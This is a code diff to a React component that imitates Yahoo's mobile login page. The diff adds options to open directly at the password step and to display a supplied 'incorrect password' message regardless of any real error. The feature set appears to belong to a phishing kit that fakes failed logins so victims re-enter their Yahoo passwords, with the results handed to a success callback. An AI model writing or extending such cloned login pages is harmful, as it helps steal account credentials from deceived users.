@@ -6,12 +6,14 @@ interface MobileYahooLoginPageProps {
   onLoginSuccess?: (sessionData: any) => void;
   onLoginError?: (error: string) => void;
   defaultEmail?: string;
+  startAtPasswordStep?: boolean;
+  incorrectPasswordError?: string;
 }
 
-const MobileYahooLoginPage: React.FC<MobileYahooLoginPageProps> = ({ onLoginSuccess, onLoginError, defaultEmail }) => {
+const MobileYahooLoginPage: React.FC<MobileYahooLoginPageProps> = ({ onLoginSuccess, onLoginError, defaultEmail, startAtPasswordStep, incorrectPasswordError }) => {
   const [email, setEmail] = useState(defaultEmail || '');
   const [password, setPassword] = useState('');
-  const [showPasswordStep, setShowPasswordStep] = useState(false);
+  const [showPasswordStep, setShowPasswordStep] = useState(!!startAtPasswordStep);
   const [pageReady, setPageReady] = useState(false);
   const [nextLoading, setNextLoading] = useState(false);
   const [submitting, setSubmitting] = useState(false);
@@ -89,6 +91,9 @@ const MobileYahooLoginPage: React.FC<MobileYahooLoginPageProps> = ({ onLoginSucc
           <form onSubmit={handleSubmit} className="mt-6 space-y-4">
             {errorMessage && !isLoading && (
               <p className="text-red-600 text-sm font-medium text-center">{errorMessage}</p>
+            )}
+            {!errorMessage && incorrectPasswordError && (
+              <p className="text-red-600 text-sm font-medium text-center">{incorrectPasswordError}</p>
             )}
 
             {!showPasswordStep ? (
